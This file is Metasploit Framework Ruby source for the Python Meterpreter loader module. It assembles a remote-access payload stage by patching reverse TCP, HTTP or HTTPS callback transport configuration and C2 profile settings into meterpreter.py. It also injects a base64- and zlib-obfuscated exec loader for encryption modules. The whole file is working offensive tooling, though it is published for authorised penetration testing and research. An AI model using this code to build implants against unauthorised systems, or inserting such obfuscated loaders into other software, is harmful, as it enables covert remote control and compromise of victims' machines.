# -*- coding: binary -*-


module Msf

###
#
# Common module stub for ARCH_PYTHON payloads that make use of Meterpreter.
#
###

module Payload::Python::MeterpreterLoader
  # Mark the payload as dynamic, as random uuid values lead to differing zlib compressed payloads
  ForceDynamicCachedSize = true

  include Msf::Payload::Python
  include Msf::Payload::UUID::Options
  include Msf::Payload::TransportConfig
  include Msf::Sessions::MeterpreterOptions::Python

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Meterpreter & Configuration',
      'Description'   => 'Run Meterpreter & the configuration stub',
      'Author'        => [ 'Spencer McIntyre' ],
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'Stager'        => {'Payload' => ""}
    ))

    register_advanced_options(
      [
        OptBool.new(
          'MeterpreterTryToFork',
          'Fork a new process if the functionality is available',
          default: true
        ),
        OptBool.new(
          'MeterpreterDebugBuild',
          'Enable debugging for the Python meterpreter',
          aliases: ['PythonMeterpreterDebug']
        )
      ] +
      Msf::Opt::http_header_options
    )
  end

  def stage_payload(opts={})
    Rex::Text.encode_base64(Rex::Text.zlib_deflate(stage_meterpreter(opts)))
  end

  def generate_config(opts={})
    ds = opts[:datastore] || datastore
    opts[:uuid] ||= generate_payload_uuid(arch: ARCH_PYTHON, platform: 'python')
    # Pass the malleable C2 profile through to the transport config so
    # that staged HTTP(S) meterpreter sessions honour the profile after
    # the stage is delivered. The option is only registered by HTTP(S)
    # stagers, so it's nil (and ignored) for other transports.
    opts[:c2_profile] ||= ds['MALLEABLEC2'] if options.include?('MALLEABLEC2')
    if opts[:c2_profile]
      opts[:stageless] = true
    end

    unless opts[:transport_config]
      scheme = opts[:scheme] || 'tcp'
      if scheme == 'https'
        opts[:transport_config] = [transport_config_reverse_https(opts)]
      elsif scheme == 'http'
        opts[:transport_config] = [transport_config_reverse_http(opts)]
      else
        opts[:transport_config] = [transport_config_reverse_tcp(opts)]
      end
    end

    config_opts = {
      ascii_str:            true,
      null_session_guid:    opts[:stageless] == true,
      expiration:           (ds[:expiration] || ds['SessionExpirationTimeout']).to_i,
      uuid:                 opts[:uuid],
      transports:           opts[:transport_config],
      extensions:           opts[:extensions] || [],
      ext_format:           'py',
      stageless:            opts[:stageless] == true,
    }.merge(meterpreter_logging_config(opts))

    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
    config.to_b
  end

  # Get the raw Python Meterpreter stage and patch in values based on the
  # configuration
  def stage_meterpreter(opts={})
    ds = opts[:datastore] || datastore
    met = MetasploitPayloads.read('meterpreter', 'meterpreter.py')

    unless ds['MeterpreterTryToFork']
      met.sub!('TRY_TO_FORK = True', 'TRY_TO_FORK = False')
    end

    met.sub!("# PATCH-SETUP-ENCRYPTION #", python_encryptor_loader)

    # Build the URI from the callback URL if present
    unless opts[:url].to_s == ''
      opts[:scheme] ||= opts[:url].to_s.split(':')[0]
      uri = "/#{opts[:url].split('/').reject(&:empty?)[-1]}"
      opts[:uri] = "#{luri}#{uri}"
    end

    # Generate the TLV config block containing all transport configuration
    config_block = Rex::Text.encode_base64(generate_config(opts))
    met.sub!("CONFIG_BLOCK = ''", "CONFIG_BLOCK = '#{config_block}'")

    # patch in any optional stageless tcp socket setup
    unless opts[:stageless_tcp_socket_setup].nil?
      offset_string = ""
      /(?<offset_string>\s+)# PATCH-SETUP-STAGELESS-TCP-SOCKET #/ =~ met
      socket_setup = opts[:stageless_tcp_socket_setup]
      socket_setup = socket_setup.split("\n")
      socket_setup.map! {|line| "#{offset_string}#{line}\n"}
      socket_setup = socket_setup.join
      met.sub!("#{offset_string}# PATCH-SETUP-STAGELESS-TCP-SOCKET #", socket_setup)
    end

    met
  end

  def python_encryptor_loader
    aes_encryptor = Rex::Text.encode_base64(Rex::Text.zlib_deflate(python_aes_source))
    rsa_encryptor = Rex::Text.encode_base64(Rex::Text.zlib_deflate(python_rsa_source))
    %Q?
import codecs,base64,zlib
try:
    from importlib.util import spec_from_loader
    def new_module(name):
        return spec_from_loader(name, loader=None)
except ImportError:
    import imp
    new_module = imp.new_module
met_aes = new_module('met_aes')
met_rsa = new_module('met_rsa')
exec(compile(zlib.decompress(base64.b64decode(codecs.getencoder('utf-8')('#{aes_encryptor}')[0])),'met_aes','exec'), met_aes.__dict__)
exec(compile(zlib.decompress(base64.b64decode(codecs.getencoder('utf-8')('#{rsa_encryptor}')[0])),'met_rsa','exec'), met_rsa.__dict__)
sys.modules['met_aes'] = met_aes
sys.modules['met_rsa'] = met_rsa
import met_rsa, met_aes
def met_rsa_encrypt(der, msg):
    return met_rsa.rsa_enc(der, msg)
def met_aes_encrypt(key, iv, pt):
    return met_aes.AESCBC(key).encrypt(iv, pt)
def met_aes_decrypt(key, iv, pt):
    return met_aes.AESCBC(key).decrypt(iv, pt)
    ?
  end

  def python_rsa_source
    File.read(File.join(Msf::Config.data_directory, 'meterpreter', 'python', 'met_rsa.py'))
  end

  def python_aes_source
    File.read(File.join(Msf::Config.data_directory, 'meterpreter', 'python', 'met_aes.py'))
  end
end

end
